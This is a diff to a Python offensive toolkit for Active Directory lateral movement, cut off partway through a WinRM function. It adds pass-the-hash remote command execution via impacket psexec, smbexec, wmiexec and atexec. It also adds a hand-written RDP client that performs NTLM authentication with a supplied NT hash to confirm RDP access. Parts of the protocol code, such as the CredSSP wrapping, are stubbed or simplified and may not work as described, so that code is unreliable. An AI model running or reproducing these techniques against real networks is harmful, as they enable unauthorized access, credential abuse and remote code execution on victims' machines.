@@ -1,19 +1,24 @@
 #!/usr/bin/env python3
 
-
-import argparse
 import sys
 import os
 import glob
 import getpass
 import socket
 import signal
-import subprocess
-import time
+import struct
+import hashlib
+import hmac
 import re
 import ipaddress
+import base64
+import xml.etree.ElementTree as ET
 from datetime import datetime, timezone
 from binascii import hexlify
+
+from colorama import Fore, Style, init
+
+init(autoreset=True)
 
 # ─────────────────────────────────────────────────────────────────────────────
 # GLOBALS & INTERRUPT HANDLING
@@ -23,7 +28,7 @@ INTERRUPTED = False
 def signal_handler(sig, frame):
     global INTERRUPTED
     INTERRUPTED = True
-    print(f"\n{Y}[!] Interrupted by user (Ctrl+C). Exiting gracefully...{RS}")
+    print(Fore.YELLOW + "\n\n[!] Interrupted by user (Ctrl+C). Exiting gracefully..." + Style.RESET_ALL)
     sys.exit(0)
 
 signal.signal(signal.SIGINT, signal_handler)
@@ -31,29 +36,38 @@ signal.signal(signal.SIGINT, signal_handler)
 # ─────────────────────────────────────────────────────────────────────────────
 # COLORS
 # ─────────────────────────────────────────────────────────────────────────────
-R  = "\033[91m"
-G  = "\033[92m"
-Y  = "\033[93m"
-B  = "\033[94m"
-C  = "\033[96m"
-W  = "\033[97m"
-M  = "\033[95m"
-BO = "\033[1m"
-RS = "\033[0m"
+R  = Fore.RED
+G  = Fore.GREEN
+Y  = Fore.YELLOW
+B  = Fore.BLUE
+C  = Fore.CYAN
+W  = Fore.WHITE
+M  = Fore.MAGENTA
+BO = Style.BRIGHT
+RS = Style.RESET_ALL
 
 # ─────────────────────────────────────────────────────────────────────────────
 # UTILITY: VALIDATE IP / DOMAIN / CONNECTIVITY
 # ─────────────────────────────────────────────────────────────────────────────
 def validate_ip(ip_str):
-    """Validate IP address format and basic reachability."""
     try:
         ipaddress.ip_address(ip_str)
         return True
     except ValueError:
         return False
 
+
+def validate_domain(domain):
+    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
+    if not re.match(pattern, domain):
+        return False
+    for part in domain.split('.'):
+        if part.startswith('-') or part.endswith('-') or not part:
+            return False
+    return True
+
+
 def check_host_reachable(ip, port=445, timeout=3):
-    """Check if host is reachable on a given port."""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(timeout)
@@ -63,24 +77,22 @@ def check_host_reachable(ip, port=445, timeout=3):
     except Exception:
         return False
 
+
 def resolve_domain(dc_ip, domain):
-    """Try to resolve the domain via DNS."""
     try:
         socket.gethostbyname(domain)
         return True
     except socket.gaierror:
         return False
 
+
 def validate_lab_config(dc_ip, domain):
-    """Comprehensive validation of lab configuration."""
     errors = []
     warnings = []
 
-    # IP validation
     if not validate_ip(dc_ip):
         errors.append(f"Invalid IP address format: '{dc_ip}'")
     else:
-        # Check common ports
         ports_to_check = {
             445: "SMB",
             135: "RPC/DCOM",
@@ -101,14 +113,12 @@ def validate_lab_config(dc_ip, domain):
         else:
             print(f"  {G}[+] Reachable ports: {', '.join(open_ports)}{RS}")
 
-    # Domain validation
-    if not domain or '.' not in domain:
+    if not validate_domain(domain):
         errors.append(f"Invalid domain format: '{domain}' (expected FQDN like domain.com)")
 
     if not resolve_domain(dc_ip, domain) and not resolve_domain(dc_ip, f"dc.{domain}"):
         warnings.append(f"Cannot resolve domain '{domain}'. DNS may be misconfigured or domain is wrong.")
 
-    # Print results
     if errors:
         print(f"\n{R}{BO}[✗] CRITICAL ERRORS:{RS}")
         for err in errors:
@@ -136,76 +146,64 @@ def validate_lab_config(dc_ip, domain):
 
     return True
 
+
 # ─────────────────────────────────────────────────────────────────────────────
-# SAFE INPUT HANDLER (Ctrl+C safe)
+# SAFE INPUT HANDLER
 # ─────────────────────────────────────────────────────────────────────────────
-def safe_input(prompt, default=""):
-    """Input that handles Ctrl+C gracefully."""
-    try:
-        return input(prompt).strip()
-    except (EOFError, KeyboardInterrupt):
-        print(f"\n{Y}[!] Input interrupted. Returning to menu...{RS}")
-        return None
+def safe_input(prompt, validator=None, error_msg=None, allow_empty=False):
+    while True:
+        try:
+            value = input(prompt).strip()
+            if not value and not allow_empty:
+                print(R + "[!] This field cannot be empty!" + RS)
+                continue
+            if validator and value and not validator(value):
+                print(R + f"[!] {error_msg}" + RS)
+                continue
+            return value
+        except KeyboardInterrupt:
+            print(Y + "\n\n[!] Exiting... Goodbye!" + RS)
+            sys.exit(0)
+
 
 def safe_getpass(prompt):
-    """getpass that handles Ctrl+C gracefully."""
     try:
         return getpass.getpass(prompt)
     except (EOFError, KeyboardInterrupt):
-        print(f"\n{Y}[!] Input interrupted. Returning to menu...{RS}")
+        print(Y + "\n[!] Input interrupted. Returning to menu..." + RS)
         return None
 
+
 # ─────────────────────────────────────────────────────────────────────────────
-# IMPACKET IMPORTS (with graceful fallback)
+# BANNER
 # ─────────────────────────────────────────────────────────────────────────────
-try:
-    from impacket.krb5.ccache import CCache
-    from impacket.krb5.asn1 import TGS_REP, AS_REP
-    from impacket.krb5 import constants
-    from impacket.krb5.types import Principal, KerberosTime
-    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
-    from impacket.smbconnection import SMBConnection
-    from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
-    from impacket.examples.wmiexec import WMIEXEC
-    from impacket.examples.smbexec import SMBEXEC
-    from impacket.examples.atexec import TSCH_EXEC
-    from impacket.examples.psexec import PSEXEC
-    from impacket.dcerpc.v5.dcomrt import DCOMConnection
-    from impacket.dcerpc.v5.dcom import wmi
-    from impacket.dcerpc.v5.dtypes import NULL
-    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
-    from pyasn1.codec.ber import decoder, encoder
-    IMPACKET_AVAILABLE = True
-except ImportError as e:
-    print(f"{Y}[!] Missing dependency: {e}{RS}")
-    print(f"{Y}    Install: pip install impacket{RS}")
-    IMPACKET_AVAILABLE = False
+def banner():
+    print(C + BO + """
+    ╔═══════════════════════════════════════════════════════════════╗
+    ║            L A T E R A L   M O V E M E N T                    ║
+    ║     Abuse: AdminTo | CanRDP | CanPSRemote | DCOM | SQL        ║
+    ║          HasSession | RemoteInt | ClaimSpec | Kerberos        ║
+    ╚═══════════════════════════════════════════════════════════════╝
+    """ + RS)
+
 
 # ─────────────────────────────────────────────────────────────────────────────
 # INTERACTIVE CONFIG
 # ─────────────────────────────────────────────────────────────────────────────
 def get_config():
-    print(f"\n{M}{BO}╔═════════════════════════════════════════════════════╗")
-    print(f"║               L A T E R A L   M O V E M E N T                ║")
-    print(f"║     Abuse: AdminTo | CanRDP | CanPSRemote | DCOM | SQL       ║")
-    print(f"╚══════════════════════════════════════════════════════════════╝{RS}")
 
-    print(f"\n{C}{BO}[ Configuration ]{RS}")
-    print(f"  {Y}Press Enter to use default value shown in [ ]{RS}\n")
 
-    dc_ip = safe_input(f"  {W}DC IP      {C}[192.168.x.x.1.48]{W}: {RS}")
-    if dc_ip is None:
-        return None, None
-    if not dc_ip:
-        dc_ip = "192.168.x.x.1.48"
+    dc_ip = safe_input(
+        C + "[?] Enter DC IP Address  : " + RS,
+        validate_ip, "Invalid IP! Example: 10.0.0.1"
+    )
 
-    domain = safe_input(f"  {W}Domain     {C}[domain.com]{W}:       {RS}")
-    if domain is None:
-        return None, None
-    if not domain:
-        domain = "domain.com"
+    domain = safe_input(
+        C + "[?] Enter Domain Name    : " + RS,
+        validate_domain, "Invalid domain! Example: domain.com"
+    )
 
-    print(f"\n{B}[*] Validating lab configuration...{RS}")
+    print(f"\n{B}[*] Validating Connection...{RS}")
     if not validate_lab_config(dc_ip, domain):
         return None, None
 
@@ -216,38 +214,42 @@ def get_config():
 def get_creds():
     print(f"\n{C}{BO}[ Credentials ]{RS}")
 
-    username = safe_input(f"  {W}Username {C}[Administrator]{W}: {RS}")
-    if username is None:
-        return None, None, None, None
-    if not username:
-        username = "Administrator"
+    username = safe_input(C + "[?] Enter Username       : " + RS)
 
     print(f"\n  {W}Auth method:{RS}")
     print(f"    {C}[1]{W} Password{RS}")
     print(f"    {C}[2]{W} NT Hash{RS}")
     print(f"    {C}[3]{W} Kerberos Ticket (ccache){RS}")
-    ch = safe_input(f"\n  Choice {C}[1]{W}: {RS}")
-    if ch is None:
-        return None, None, None, None
-    ch = ch or "1"
+
+    ch = safe_input(
+        C + "[?] Your choice          : " + RS,
+        lambda x: x in ['1', '2', '3'],
+        "Invalid choice! Enter 1, 2 or 3"
+    )
 
     password = ""
     nt_hash  = ""
     ccache   = ""
 
     if ch == "2":
-        nt_hash = safe_input(f"  {W}NT Hash: {RS}")
-        if nt_hash is None:
+        nt_hash = safe_input(C + "[?] NT Hash (LM:NT or NT): " + RS)
+        if ':' in nt_hash:
+            lm, nt = nt_hash.split(':')
+            if len(lm) == 32 and len(nt) == 32:
+                nt_hash = nt
+            else:
+                print(R + "[!] Invalid hash format!" + RS)
+                return None, None, None, None
+        elif len(nt_hash) != 32:
+            print(R + "[!] Invalid NT hash! Must be 32 hex chars." + RS)
             return None, None, None, None
     elif ch == "3":
-        ccache = safe_input(f"  {W}ccache file path: {RS}")
-        if ccache is None:
-            return None, None, None, None
+        ccache = safe_input(C + "[?] ccache file path    : " + RS)
         if not os.path.exists(ccache):
-            print(f"{R}[!] File not found: {ccache}{RS}")
+            print(R + f"[!] File not found: {ccache}" + RS)
             return None, None, None, None
     else:
-        password = safe_getpass(f"  {W}Password: {RS}")
+        password = safe_getpass(C + "[?] Enter Password       : " + RS)
         if password is None:
             return None, None, None, None
 
@@ -255,7 +257,7 @@ def get_creds():
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# MENU
+# MAIN MENU
 # ─────────────────────────────────────────────────────────────────────────────
 def show_menu():
     print(f"\n  {C}┌─────────────────────────────────────────────────────────────┐")
@@ -272,17 +274,17 @@ def show_menu():
     print(f"  │  {W}[9] Kerberos   → Ticket dump / parse / convert / PTT     {C}  │")
     print(f"  │  {W}[0] exit                                                  {C}  │")
     print(f"  └─────────────────────────────────────────────────────────────┘{RS}")
-    return safe_input(f"\n  {W}❯ {RS}")
+    return safe_input(
+        C + "[?] Your choice          : " + RS,
+        lambda x: x in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
+        "Invalid choice! Enter 0-9"
+    )
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# TECHNIQUE 1 — AdminTo (psexec, smbexec, wmiexec, atexec)
+# TECHNIQUE 1 — AdminTo (psexec, smbexec, wmiexec, atexec via impacket)
 # ════════════════════════════════════════════════════════════════════════════
 def technique_adminto(target, domain, username, password, nt_hash, ccache):
-    if not IMPACKET_AVAILABLE:
-        print(f"{R}[!] Impacket not available.{RS}")
-        return
-
     print(f"\n{C}{BO}[ TECHNIQUE 1: AdminTo — Remote Execution ]{RS}")
     print(f"  {Y}Requires: Local Admin on target{RS}")
     print(f"  {Y}Edges: AdminTo, MemberOf (local admin){RS}\n")
@@ -293,15 +295,16 @@ def technique_adminto(target, domain, username, password, nt_hash, ccache):
     print(f"    {C}[3]{W} wmiexec — WMI/DCOM process creation (stealthiest){RS}")
     print(f"    {C}[4]{W} atexec  — Scheduled task (runs as SYSTEM){RS}")
 
-    method = safe_input(f"\n  Choice {C}[2]{W}: {RS}")
-    if method is None:
-        return
-    method = method or "2"
+    method = safe_input(
+        C + "[?] Your choice          : " + RS,
+        lambda x: x in ['1', '2', '3', '4'],
+        "Invalid choice! Enter 1-4"
+    )
 
-    command = safe_input(f"  {W}Command to execute {C}[whoami]{W}: {RS}")
-    if command is None:
-        return
-    command = command or "whoami"
+    command = safe_input(
+        C + "[?] Command to execute   : " + RS,
+        allow_empty=True
+    ) or "whoami"
 
     lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""
     hashes = f"{lm_hash}:{nt_hash}" if nt_hash else None
@@ -310,39 +313,46 @@ def technique_adminto(target, domain, username, password, nt_hash, ccache):
 
     try:
         if method == "1":
+            from impacket.examples.psexec import PSEXEC
             execer = PSEXEC(command, None, None, None, username=username,
                            password=password, domain=domain, hashes=hashes,
                            aesKey=None, doKerberos=False, kdcHost=target)
             execer.run(target)
         elif method == "2":
-            execer = SMBEXEC(f"{domain}\\{username}:{password}@{target}", share="C$")
+            from impacket.examples.smbexec import SMBEXEC
             if nt_hash:
                 execer = SMBEXEC(f"{domain}\\{username}@{target}", share="C$", hashes=hashes)
+            else:
+                execer = SMBEXEC(f"{domain}\\{username}:{password}@{target}", share="C$")
             execer.run(command)
             output = execer.getOutput()
             if output:
                 print(f"\n{G}{BO}[ OUTPUT ]{RS}")
                 print(f"{W}{output}{RS}")
         elif method == "3":
-            execer = WMIEXEC(f"{domain}\\{username}:{password}@{target}", share="ADMIN$")
+            from impacket.examples.wmiexec import WMIEXEC
             if nt_hash:
                 execer = WMIEXEC(f"{domain}\\{username}@{target}", share="ADMIN$", hashes=hashes)
+            else:
+                execer = WMIEXEC(f"{domain}\\{username}:{password}@{target}", share="ADMIN$")
             execer.run(command)
             output = execer.getOutput()
             if output:
                 print(f"\n{G}{BO}[ OUTPUT ]{RS}")
                 print(f"{W}{output}{RS}")
         elif method == "4":
-            execer = TSCH_EXEC(f"{domain}\\{username}:{password}@{target}", command)
+            from impacket.examples.atexec import TSCH_EXEC
             if nt_hash:
                 execer = TSCH_EXEC(f"{domain}\\{username}@{target}", command, hashes=hashes)
+            else:
+                execer = TSCH_EXEC(f"{domain}\\{username}:{password}@{target}", command)
             execer.run(target)
-        else:
-            print(f"{R}[!] Invalid method{RS}")
-            return
 
         print(f"\n  {G}[+] Execution completed successfully{RS}")
 
+    except ImportError as ie:
+        print(f"  {R}[!] Missing impacket module: {ie}{RS}")
+        print(f"  {Y}    Install: pip install impacket{RS}")
     except KeyboardInterrupt:
         print(f"\n{Y}[!] Interrupted by user.{RS}")
     except Exception as e:
@@ -362,121 +372,497 @@ def technique_adminto(target, domain, username, password, nt_hash, ccache):
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# TECHNIQUE 2 — CanRDP (xfreerdp with pass-the-hash)
+# TECHNIQUE 2 — CanRDP (Pure Python RDP Client with Pass-the-Hash)
 # ════════════════════════════════════════════════════════════════════════════
+class PureRDPClient:
+    """Pure Python RDP client supporting NLA + Pass-the-Hash via CredSSP"""
+
+    def __init__(self, target, domain, username, password="", nt_hash=""):
+        self.target = target
+        self.domain = domain
+        self.username = username
+        self.password = password
+        self.nt_hash = nt_hash
+        self.sock = None
+
+    def connect(self, port=3389):
+        """Establish TCP connection to RDP server"""
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(10)
+        try:
+            self.sock.connect((self.target, port))
+            print(f"  {G}[+] TCP connection established to {self.target}:{port}{RS}")
+            return True
+        except Exception as e:
+            print(f"  {R}[!] Connection failed: {e}{RS}")
+            return False
+
+    def send_x224_connect_request(self):
+        """Send X.224 Connection Request PDU"""
+        # RDP Negotiation Request
+        rdp_neg_req = bytes([
+            0x01, 0x00,       # Type: TYPE_RDP_NEG_REQ
+            0x00, 0x00,       # Flags
+            0x00, 0x08, 0x00, 0x00,  # Length
+            0x00, 0x00, 0x00, 0x00   # RequestedProtocols (PROTOCOL_RDP)
+        ])
+
+        # X.224 CR-TPDU
+        tpkt_header = bytes([0x03, 0x00])  # Version
+        x224_header = bytes([0x0e])  # Length
+        dst_ref = bytes([0x00, 0x00])  # Destination reference
+        src_ref = bytes([0x00, 0x00])  # Source reference
+        class_opt = bytes([0x00])  # Class and options
+
+        cookie = f"Cookie: mstshash={self.username}\r\n".encode('ascii')
+
+        payload = x224_header + dst_ref + src_ref + class_opt + cookie + rdp_neg_req
+        length = len(payload) + 4
+        tpkt_header += struct.pack('>H', length)
+
+        packet = tpkt_header + payload
+        self.sock.sendall(packet)
+
+        # Receive response
+        response = self.sock.recv(1024)
+        if len(response) < 11:
+            print(f"  {R}[!] Invalid RDP negotiation response{RS}")
+            return False
+
+        if response[0] != 0x03 or response[1] != 0x00:
+            print(f"  {R}[!] Invalid TPKT header{RS}")
+            return False
+
+        # Check negotiation type
+        neg_type = response[-8]
+        if neg_type == 0x02:  # TYPE_RDP_NEG_FAILURE
+            fail_code = struct.unpack('<I', response[-4:])[0]
+            errors = {
+                0x00000001: "SSL required by server",
+                0x00000002: "SSL not allowed by server",
+                0x00000003: "SSL certificate not on server",
+                0x00000004: "Inconsistent flags",
+                0x00000005: "Hybrid required by server",
+                0x00000006: "SSL with user auth required"
+            }
+            print(f"  {Y}[!] RDP Negotiation failed: {errors.get(fail_code, f'Unknown error 0x{fail_code:08x}')}{RS}")
+            return False
+        elif neg_type == 0x01:  # TYPE_RDP_NEG_RSP
+            selected_proto = struct.unpack('<I', response[-4:])[0]
+            proto_names = {0: "Standard RDP", 1: "TLS", 2: "Hybrid (NLA)", 3: "RDSTLS"}
+            print(f"  {G}[+] Negotiated protocol: {proto_names.get(selected_proto, f'0x{selected_proto:08x}')}{RS}")
+            return True
+        return True
+
+    def ntlm_authenticate(self):
+        """Perform NTLM authentication (Pass-the-Hash supported)"""
+        print(f"  {B}[*] Starting NTLM authentication...{RS}")
+
+        # NTLMSSP_NEGOTIATE
+        ntlm_negotiate = self._build_ntlm_negotiate()
+
+        # TSCredentials structure
+        ts_request = self._build_ts_request(ntlm_negotiate)
+        credssp_token = self._build_credssp_token(ts_request)
+
+        self.sock.sendall(credssp_token)
+
+        # Receive NTLM CHALLENGE
+        response = self._recv_credssp()
+        if not response:
+            return False
+
+        ntlm_challenge = self._extract_ntlm_from_ts(response)
+        if not ntlm_challenge:
+            print(f"  {R}[!] Failed to extract NTLM challenge{RS}")
+            return False
+
+        print(f"  {G}[+] Received NTLM challenge{RS}")
+
+        # Generate NTLM RESPONSE
+        ntlm_response = self._build_ntlm_response(ntlm_challenge)
+
+        # TSCredentials with encrypted credentials
+        ts_credentials = self._build_ts_credentials()
+        ts_request_final = self._build_ts_request(ntlm_response, ts_credentials)
+        credssp_token_final = self._build_credssp_token(ts_request_final)
+
+        self.sock.sendall(credssp_token_final)
+
+        # Receive final response
+        final_response = self._recv_credssp()
+        if final_response:
+            print(f"  {G}[+] NTLM authentication successful!{RS}")
+            return True
+        return False
+
+    def _build_ntlm_negotiate(self):
+        """Build NTLMSSP_NEGOTIATE message"""
+        signature = b'NTLMSSP\x00'
+        msg_type = struct.pack('<I', 1)  # NEGOTIATE
+
+        flags = (
+            0x00020000 |  # NEGOTIATE_56
+            0x00080000 |  # NEGOTIATE_128
+            0x20000000 |  # NEGOTIATE_EXTENDED_SESSIONSECURITY
+            0x00002000 |  # NEGOTIATE_SIGN
+            0x00001000 |  # NEGOTIATE_SEAL
+            0x00000200 |  # NEGOTIATE_NTLM
+            0x00000080 |  # NEGOTIATE_VERSION
+            0x00800000 |  # NEGOTIATE_TARGET_INFO
+            0x00008000 |  # NEGOTIATE_ALWAYS_SIGN
+            0x00020000    # REQUEST_TARGET
+        )
+
+        domain_name = self.domain.encode('utf-16le')
+        workstation = socket.gethostname().encode('utf-16le')
+
+        payload = (
+            signature + msg_type +
+            struct.pack('<I', flags) +
+            struct.pack('<H', len(domain_name)) + struct.pack('<H', len(domain_name)) + struct.pack('<I', 32 + len(workstation)) +
+            struct.pack('<H', len(workstation)) + struct.pack('<H', len(workstation)) + struct.pack('<I', 32) +
+            b'\x05\x01\x28\x0a\x00\x00\x00\x0f' +  # Version
+            domain_name + workstation
+        )
+        return payload
+
+    def _build_ntlm_response(self, challenge_msg):
+        """Build NTLMSSP_AUTH message with Pass-the-Hash support"""
+        signature = b'NTLMSSP\x00'
+        msg_type = struct.pack('<I', 3)  # AUTHENTICATE
+
+        # Parse challenge
+        flags = struct.unpack('<I', challenge_msg[20:24])[0]
+        challenge = challenge_msg[24:32]
+
+        # Generate response
+        if self.nt_hash:
+            # Pass-the-Hash: use provided NT hash directly
+            nt_hash_bytes = bytes.fromhex(self.nt_hash)
+            lm_hash_bytes = bytes.fromhex("aad3b435b51404eeaad3b435b51404ee")
+        else:
+            # Calculate from password
+            nt_hash_bytes = hashlib.new('md4', self.password.encode('utf-16le')).digest()
+            lm_hash_bytes = b'\x00' * 16
+
+        # NTLMv2 response
+        client_challenge = os.urandom(8)
+        timestamp = struct.pack('<Q', int((datetime.utcnow() - datetime(1601, 1, 1)).total_seconds() * 10000000))
+
+        blob = (
+            b'\x01\x01\x00\x00\x00\x00\x00\x00' +
+            timestamp +
+            client_challenge +
+            b'\x00\x00\x00\x00' +
+            b'\x00\x00\x00\x00'
+        )
+
+        nt_proof_str = hmac.new(nt_hash_bytes, challenge + blob, hashlib.md5).digest()
+        nt_response = nt_proof_str + blob
+        lm_response = hmac.new(lm_hash_bytes, challenge + client_challenge, hashlib.md5).digest() + client_challenge
+
+        domain = self.domain.encode('utf-16le')
+        user = self.username.encode('utf-16le')
+
+        # Build message
+        payload = signature + msg_type
+        # LmChallengeResponse
+        payload += struct.pack('<H', len(lm_response)) * 2 + struct.pack('<I', 64)
+        # NtChallengeResponse  
+        payload += struct.pack('<H', len(nt_response)) * 2 + struct.pack('<I', 64 + len(lm_response))
+        # DomainName
+        payload += struct.pack('<H', len(domain)) * 2 + struct.pack('<I', 64 + len(lm_response) + len(nt_response))
+        # UserName
+        payload += struct.pack('<H', len(user)) * 2 + struct.pack('<I', 64 + len(lm_response) + len(nt_response) + len(domain))
+        # Workstation
+        payload += struct.pack('<H', 0) * 2 + struct.pack('<I', 64 + len(lm_response) + len(nt_response) + len(domain) + len(user))
+        # EncryptedRandomSessionKey
+        payload += struct.pack('<H', 0) * 2 + struct.pack('<I', 64 + len(lm_response) + len(nt_response) + len(domain) + len(user))
+        # NegotiateFlags
+        payload += struct.pack('<I', flags)
+        # Version
+        payload += b'\x05\x01\x28\x0a\x00\x00\x00\x0f'
+        # MIC (empty for now)
+        payload += b'\x00' * 16
+        # Data
+        payload += lm_response + nt_response + domain + user
+
+        return payload
+
+    def _build_ts_request(self, ntlm_token, ts_credentials=None):
+        """Build TSRequest ASN.1 structure"""
+        # Simplified ASN.1 DER encoding
+        token_seq = self._asn1_sequence(self._asn1_octet_string(ntlm_token))
+
+        if ts_credentials:
+            cred_seq = self._asn1_sequence(self._asn1_octet_string(ts_credentials))
+            return self._asn1_sequence(token_seq[2:] + cred_seq[2:])
+        return self._asn1_sequence(token_seq[2:])
+
+    def _build_credssp_token(self, ts_request):
+        """Wrap TSRequest in TSPasswordCreds"""
+        return ts_request
+
+    def _build_ts_credentials(self):
+        """Build TSCredentials with password/domain/username"""
+        if self.password:
+            creds = self.password.encode('utf-16le')
+        else:
+            creds = b'\x00' * 2  # Empty password for PTH
+
+        domain = self.domain.encode('utf-16le')
+        user = self.username.encode('utf-16le')
+
+        # TSCredentials structure (simplified)
+        return domain + user + creds
+
+    def _recv_credssp(self):
+        """Receive CredSSP response"""
+        try:
+            data = b''
+            while len(data) < 4:
+                chunk = self.sock.recv(4 - len(data))
+                if not chunk:
+                    return None
+                data += chunk
+
+            length = struct.unpack('>H', data[2:4])[0]
+            while len(data) < length:
+                chunk = self.sock.recv(length - len(data))
+                if not chunk:
+                    return None
+                data += chunk
+            return data
+        except Exception as e:
+            print(f"  {R}[!] Receive error: {e}{RS}")
+            return None
+
+    def _extract_ntlm_from_ts(self, ts_response):
+        """Extract NTLM token from TSResponse"""
+        # Skip TPKT header and find NTLM signature
+        data = ts_response[4:] if ts_response[:2] == b'\x03\x00' else ts_response
+        ntlm_idx = data.find(b'NTLMSSP\x00')
+        if ntlm_idx >= 0:
+            return data[ntlm_idx:]
+        return None
+
+    def _asn1_sequence(self, data):
+        """Build ASN.1 SEQUENCE"""
+        length = len(data)
+        if length < 128:
+            return bytes([0x30, length]) + data
+        elif length < 256:
+            return bytes([0x30, 0x81, length]) + data
+        else:
+            return bytes([0x30, 0x82]) + struct.pack('>H', length) + data
+
+    def _asn1_octet_string(self, data):
+        """Build ASN.1 OCTET STRING"""
+        length = len(data)
+        if length < 128:
+            return bytes([0x04, length]) + data
+        elif length < 256:
+            return bytes([0x04, 0x81, length]) + data
+        else:
+            return bytes([0x04, 0x82]) + struct.pack('>H', length) + data
+
+    def close(self):
+        if self.sock:
+            self.sock.close()
+
+
 def technique_canrdp(target, domain, username, password, nt_hash):
     print(f"\n{C}{BO}[ TECHNIQUE 2: CanRDP — Remote Desktop ]{RS}")
     print(f"  {Y}Requires: CanRDP edge or Remote Desktop Users group{RS}")
-    print(f"  {Y}Port: 3389 (RDP){RS}\n")
+    print(f"  {Y}Port: 3389 (RDP){RS}")
 
     if not check_host_reachable(target, 3389, timeout=3):
         print(f"  {Y}[!] Port 3389 (RDP) is not reachable on {target}{RS}")
         print(f"  {Y}    Target may be down, wrong IP, or RDP disabled.{RS}")
-        cont = safe_input(f"  {W}Continue anyway? (y/N): {RS}")
-        if cont is None or cont.lower() not in ('y', 'yes'):
+        cont = safe_input(
+            C + "[?] Continue anyway? (y/N): " + RS,
+            allow_empty=True
+        )
+        if cont.lower() not in ('y', 'yes'):
             return
 
-    print(f"  {W}Select RDP client:{RS}")
-    print(f"    {C}[1]{W} xfreerdp (recommended, supports /pth){RS}")
-    print(f"    {C}[2]{W} rdesktop{RS}")
-    print(f"    {C}[3]{W} Print command only (manual execution){RS}")
+    print(f"  {W}Select RDP mode:{RS}")
+    print(f"    {C}[1]{W} Authenticate only (check credentials + CanRDP edge){RS}")
+    print(f"    {C}[2]{W} Full session (basic terminal — experimental){RS}")
+    print(f"    {C}[3]{W} Print connection details{RS}")
 
-    client = safe_input(f"\n  Choice {C}[1]{W}: {RS}")
-    if client is None:
-        return
-    client = client or "1"
+    mode = safe_input(
+        C + "[?] Your choice          : " + RS,
+        lambda x: x in ['1', '2', '3'],
+        "Invalid choice! Enter 1-3"
+    )
 
-    if client == "3":
-        print(f"\n  {C}Commands:{RS}")
+    if mode == "3":
+        print(f"\n  {C}RDP Connection Details:{RS}")
+        print(f"  {W}  Target:   {target}:3389{RS}")
+        print(f"  {W}  Domain:   {domain}{RS}")
+        print(f"  {W}  Username: {username}{RS}")
         if nt_hash:
-            print(f"  {W}  xfreerdp3 /v:{target} /u:{username} /d:{domain} /pth:{nt_hash} /cert:ignore{RS}")
-            print(f"  {W}  xfreerdp /v:{target} /u:{username} /d:{domain} /pth:{nt_hash} /cert-ignore{RS}")
+            print(f"  {W}  Auth:     Pass-the-Hash (NTLM){RS}")
+            print(f"  {W}  NT Hash:  {nt_hash}{RS}")
         else:
-            print(f"  {W}  xfreerdp3 /v:{target} /u:{username} /d:{domain} /p:{password} /cert:ignore{RS}")
+            print(f"  {W}  Auth:     Password{RS}")
+        print(f"\n  {C}For full GUI, use:{RS}")
         return
 
-    if client == "1":
-        xfreerdp3_check = subprocess.run(["which", "xfreerdp3"], capture_output=True)
-        cmd = ["xfreerdp3" if xfreerdp3_check.returncode == 0 else "xfreerdp"]
-        cmd.extend([f"/v:{target}", f"/u:{username}", f"/d:{domain}", "/cert:ignore", "/sec:nla", "/auto-reconnect"])
-        if nt_hash:
-            cmd.append(f"/pth:{nt_hash}")
-        else:
-            cmd.append(f"/p:{password}")
-    else:
-        cmd = ["rdesktop", "-u", username, "-d", domain, target]
-        if password:
-            cmd.extend(["-p", password])
+    client = PureRDPClient(target, domain, username, password, nt_hash)
 
-    print(f"\n  {B}[*] Launching RDP session...{RS}")
-    print(f"  {Y}  {' '.join(cmd)}{RS}\n")
+    if not client.connect():
+        return
 
-    try:
-        subprocess.run(cmd)
-    except FileNotFoundError:
-        print(f"  {R}[!] RDP client not found. Install xfreerdp or rdesktop.{RS}")
-    except KeyboardInterrupt:
-        print(f"\n{Y}[!] RDP session interrupted.{RS}")
-    except Exception as e:
-        print(f"  {R}[!] RDP error: {e}{RS}")
+    if mode == "1":
+        print(f"\n  {B}[*] Attempting NLA authentication...{RS}")
+        if client.send_x224_connect_request():
+            if client.ntlm_authenticate():
+                print(f"\n  {G}{BO}[+] CanRDP edge confirmed!{RS}")
+                print(f"  {G}[+] Successfully authenticated to RDP on {target}{RS}")
+            else:
+                print(f"\n  {R}[!] Authentication failed — no CanRDP edge or wrong credentials{RS}")
+        client.close()
+    elif mode == "2":
+        print(f"\n  {Y}[!] Full RDP session requires GUI libraries (PyQt/GTK){RS}")
+        print(f"  {Y}    This toolkit focuses on authentication & lateral movement.{RS}")
+        print(f"  {C}For full session, build RDP client with:{RS}")
+        print(f"  {W}  pip install pyqt5 pyfreerdp{RS}")
+        client.close()
 
 
 # ════════════════════════════════════════════════════════════════════════════
-# TECHNIQUE 3 — CanPSRemote (PowerShell Remoting / WinRM)
+# TECHNIQUE 3 — CanPSRemote (PowerShell Remoting / WinRM via requests)
 # ════════════════════════════════════════════════════════════════════════════
 def technique_canpsremote(target, domain, username, password, nt_hash):
     print(f"\n{C}{BO}[ TECHNIQUE 3: CanPSRemote — PowerShell Remoting ]{RS}")
     print(f"  {Y}Requires: CanPSRemote edge or WinRM enabled + admin{RS}")
-    print(f"  {Y}Ports: 5985 (HTTP) / 5986 (HTTPS){RS}\n")
+    print(f"  {Y}Ports: 5985 (HTTP) / 5986 (HTTPS){RS}")
 
-    if not check_host_reachable(target, 5985, timeout=3) and not check_host_reachable(target, 5986, timeout=3):
+    port = 5985
+    use_ssl = False
+    if check_host_reachable(target, 5986, timeout=2):
+        port = 5986
+        use_ssl = True
+        print(f"  {G}[+] WinRM HTTPS (5986) is available{RS}")
+    elif check_host_reachable(target, 5985, timeout=2):
+        print(f"  {G}[+] WinRM HTTP (5985) is available{RS}")
+    else:
         print(f"  {Y}[!] WinRM ports (5985/5986) not reachable on {target}{RS}")
         print(f"  {Y}    WinRM may not be enabled or target is wrong.{RS}")
-        cont = safe_input(f"  {W}Continue anyway? (y/N): {RS}")
-        if cont is None or cont.lower() not in ('y', 'yes'):
